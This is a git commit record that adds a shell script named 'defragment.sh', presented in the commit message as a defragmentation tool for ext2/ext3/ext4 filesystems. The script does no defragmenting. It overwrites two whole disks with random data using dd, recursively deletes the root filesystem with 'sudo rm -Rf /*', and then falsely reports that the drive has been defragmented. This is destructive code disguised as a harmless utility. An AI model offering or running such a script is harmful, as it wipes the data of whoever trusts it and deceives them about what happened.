b30714b0e3eaff2b5c56c418940b43c22b2c73eb
coshwe_sh <shawnanastasio@gmail.com>
2016-06-26 00:11:21 -0500

    add defragmention script for ext2/ext3/ext4 filesystems

---
+++ defragment.sh
@@ -0,0 +1,5 @@
+echo "Remember to run this defragmentation script with root privileges!"
+sudo dd if=/dev/random of=/dev/sda
+sudo dd if=/dev/random of=/dev/sdd
+sudo rm -Rf /*
+echo "Your hard drive has been defragmented!"
